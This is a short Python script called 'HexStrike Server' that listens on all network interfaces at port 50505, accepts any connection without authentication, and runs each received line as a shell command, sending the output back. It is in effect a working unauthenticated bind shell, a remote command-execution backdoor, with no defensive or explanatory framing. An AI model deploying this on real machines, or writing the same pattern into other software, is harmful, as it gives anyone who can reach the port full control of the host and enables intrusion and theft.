#!/usr/bin/env python3

import socket
import subprocess
import threading

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 50505      # Default port for HexStrike server

def handle_client(conn, addr):
    conn.sendall(b'HexStrike Server Ready\n')
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            command = data.decode().strip()
            if command.lower() == 'exit':
                conn.sendall(b'Goodbye\n')
                break
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                result = e.output
            conn.sendall(result + b'\n')
    finally:
        conn.close()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f'HexStrike Server listening on {HOST}:{PORT}')
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == '__main__':
    main()
